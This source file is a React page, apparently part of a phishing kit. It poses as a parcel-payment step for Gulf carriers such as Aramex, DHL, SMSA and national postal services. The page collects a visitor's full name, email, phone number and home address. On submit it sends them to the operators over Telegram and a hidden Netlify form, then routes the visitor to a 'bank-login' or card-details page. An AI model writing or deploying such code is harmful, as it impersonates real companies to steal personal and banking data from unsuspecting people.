import { useEffect, useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
import FullScreenLoader from "@/components/FullScreenLoader";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLink(id);
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  
  useEffect(() => {
    const method = sessionStorage.getItem('paymentMethod');
    if (!method) {
      navigate(`/pay/${id}/track`);
    }
  }, [id, navigate]);

  if (isLoading) {
    return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
  }

  if (!linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-lg font-semibold mb-2">الرابط غير متاح</h2>
          <p className="text-sm text-muted-foreground">تعذر العثور على تفاصيل الدفع. تأكد من صحة الرابط.</p>
        </div>
      </div>
    );
  }

  const payload = (linkData.payload ?? {}) as Record<string, any>;
  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null;
  const serviceKey = payload.service_key || payload.service || urlService || 'aramex';
  const serviceName = payload.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = payload;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
  };
  
  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');
    
    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }
    
    // Send data to Telegram
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${window.location.origin}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    if (telegramResult.success) {
      console.log('Recipient data sent to Telegram successfully');
    } else {
      console.error('Failed to send recipient data to Telegram:', telegramResult.error);
    }

    sessionStorage.setItem('customerInfo', JSON.stringify({
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      address: residentialAddress,
      service: serviceName,
      amount: formattedAmount
    }));

    const method = sessionStorage.getItem('paymentMethod') || 'card';
    if (method === 'login') {
      const bank = sessionStorage.getItem('selectedBank');
      if (!bank || bank === 'skipped') {
        sessionStorage.removeItem('selectedBank');
        navigate(`/pay/${id}/track`);
        return;
      }
      navigate(`/pay/${id}/bank-login`);
    } else {
      sessionStorage.setItem('selectedBank', 'skipped');
      navigate(`/pay/${id}/details`);
    }
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        amount={formattedAmount}
        title={`معلومات المستلم - ${serviceName}`}
        description={`أدخل معلومات المستلم لخدمة ${serviceName}`}
      />
      <div 
        className="min-h-screen bg-background" 
        dir="rtl"
      >
        {/* Hero Section */}
        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            {branding.logo && (
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>
                  
                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                    }}
                  >
                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                  </div>
                </div>

                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="example@email.com"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="+966 5X XXX XXXX"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
                      العنوان السكني
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      placeholder="أدخل عنوانك السكني الكامل"
                    />
                  </div>
                </div>
              
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                </Button>
              
                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
              
              {/* Hidden Netlify Form */}
              <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                <input type="text" name="name" />
                <input type="email" name="email" />
                <input type="tel" name="phone" />
                <input type="text" name="address" />
                <input type="text" name="service" />
                <input type="text" name="amount" />
                <input type="text" name="linkId" />
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
